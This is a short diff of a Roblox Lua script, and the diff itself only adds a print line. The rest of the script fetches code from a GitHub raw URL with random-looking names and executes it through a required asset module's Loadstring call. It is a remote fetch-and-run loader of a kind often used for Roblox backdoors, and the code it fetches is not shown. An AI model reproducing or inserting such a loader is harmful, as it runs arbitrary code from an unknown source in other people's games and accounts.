@@ -1,4 +1,5 @@
 print("loadway1")
+print("loadway2")
 local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
 require(8082203830):Loadstring(Source)
 print("loadway2")
